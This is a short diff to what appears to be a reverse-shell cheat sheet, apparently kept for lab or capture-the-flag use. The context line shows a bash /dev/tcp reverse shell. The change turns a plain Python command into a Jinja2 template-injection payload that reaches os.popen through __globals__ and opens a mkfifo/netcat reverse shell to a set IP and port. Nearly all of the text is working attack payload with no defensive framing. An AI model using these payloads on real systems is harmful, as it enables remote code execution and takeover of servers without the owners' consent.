@@ -12,6 +12,6 @@ bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
 ---
 for jinja2
 ```http
-__import__('os').popen('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc YOUR_IP PORT > /tmp/f').read()
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.11.147.65 9000 > /tmp/f').read() }}
 ```
 ---
